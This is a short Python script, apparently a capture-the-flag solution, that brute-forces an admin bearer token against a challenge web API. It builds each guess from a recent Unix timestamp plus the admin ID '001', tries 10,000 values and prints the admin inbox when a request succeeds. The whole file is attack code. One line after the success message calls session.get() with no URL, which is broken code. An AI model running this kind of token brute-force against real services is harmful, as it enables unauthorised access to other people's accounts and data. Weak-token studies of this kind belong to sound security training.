import requests
import sys

# Replace with the actual challenge URL
TARGET_URL = "http://ba3c00e6-be65-4ab6-8758-23a559e65472.offsec.m0lecon.it:8001/api/inbox" 


# first known timestamp
START_TIMESTAMP = 1775838744 

def brute_force_admin_token():
    print(f"[*] Starting token brute-force against {TARGET_URL}")
    
    session = requests.Session()
    
    # Let's check the last 10,000 seconds (roughly 2.7 hours before your login)
    for i in range(10000):
        test_timestamp = START_TIMESTAMP - i
        
        
        # Construct the token: Timestamp + Admin ID (001)
        test_token = f"{test_timestamp}001"
            
        headers = {
            "Authorization": f"Bearer {test_token}"
        }
            
        try:
                # We use timeout and a slight delay if rate-limiting is an issue
            response = session.get(TARGET_URL, headers=headers, timeout=5)
                
            sys.stdout.write(f"\rTesting Token: {test_token} | Status: {response.status_code}")
            sys.stdout.flush()
                
            # Assuming a failed auth returns 401 Unauthorized, we look for 200 OK
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"\n\n[+] SUCCESS! Admin token found: {test_token}")
                print(f"[+] Admin Inbox Content:\n{response.text}")
                response = session.get()
                    
                # Once you have this token, you can manually use it in Burp/Postman
                # to call GET /api/messages/X to read the secret key!
                break
                    
        except requests.exceptions.RequestException:
            print(f"\n[!] Connection error at token {test_token}. Server might be overwhelmed.")
            break

if __name__ == "__main__":
    brute_force_admin_token()